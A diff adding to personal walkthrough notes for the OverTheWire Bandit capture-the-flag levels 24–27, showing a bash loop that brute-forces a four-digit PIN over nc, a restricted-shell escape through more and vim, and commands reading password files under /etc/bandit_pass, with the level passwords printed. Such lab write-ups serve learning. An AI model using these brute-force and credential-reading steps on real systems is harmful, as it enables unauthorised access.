@@ -790,6 +790,116 @@ A daemon is listening on port 30002 and will give you the password for bandit25 
 You do not need to create new connections each time.
 
 CLI:
+
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Timeout. Exiting.
+
+bandit24@bandit:~$ mktemp -d
+/tmp/tmp.tj5NdkweE8
+bandit24@bandit:~$ cd /tmp/tmp.tj5NdkweE8
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ nano brute_force.sh
+Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
+It is required for saving/loading search history or cursor positions.
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ ls
+brute_force.sh
+  #!/bin/bash
+
+  pw=VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+  for i in {0000..9999}
+  do 
+          echo "$pw $i"
+  done |
+  nc localhost 30002
+
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ ls -l
+total 8
+-rwx------ 1 bandit24 bandit24 116 Apr  2 02:13 brute_force.sh
+-rw-rw-r-- 1 bandit24 bandit24 169 Apr  2 02:00 combinations.txt
+-rw-rw-r-- 1 bandit24 bandit24   0 Apr  2 01:59 combination.txt
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ chmod u+x brute_force.sh
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ ./brute_force.sh
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Correct!
+The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+Exiting.
+bandit24@bandit:/tmp/tmp.tj5NdkweE8$ 
+
+---
+Level 25
+
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+password: p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+Objective:
+
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.
+
+CLI:
+
+bandit25@bandit:~$ ls -al bandit26.sshkey
+-r-------- 1 bandit25 bandit25 1679 Oct 16 14:00 bandit26.sshkey
+bandit25@bandit:~$ cat /etc/passwd | grep bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextbandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/shexport TERM=linuxmore ~/text.txt
+exit 0
+
+  shrink terminal and v to use vim editor
+
+$ ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.sshkey
+
+v
+: /etc/bandit_pass/bandit26
+
+c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+---
+
+Level 26
+
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+password: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+Objective:
+
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+Just like 25, shrink the terminal so you get the "more option" and then v to enter vim
+
+
+
+CLI:
+
+bandit26@bandit:~$ whoami
+bandit26
+bandit26@bandit:~$ ls
+bandit27-do  text.txt
+bandit26@bandit:~$ ./bandit27-do
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+bandit26@bandit:~$ 
+
+---
+Level 27
+
+ssh bandit27@bandit.labs.overthewire.org -p 2220
+password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+
+Objective:
+
+There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo via the port 2220. The password for the user bandit27-git is the same as for the user bandit27.
+
+Clone the repository and find the password for the next level.
+
+CLI:
+
+
 ===
 Template
 
@@ -842,5 +952,10 @@ man job control’ (bg, fg, jobs, &, CTRL-Z, …)
 man cron, 
 man crontab
 man crontab(5) (use “man 5 crontab” to access this)
+man more
+man vi
+man ls
+man id
+man pwd
 
 
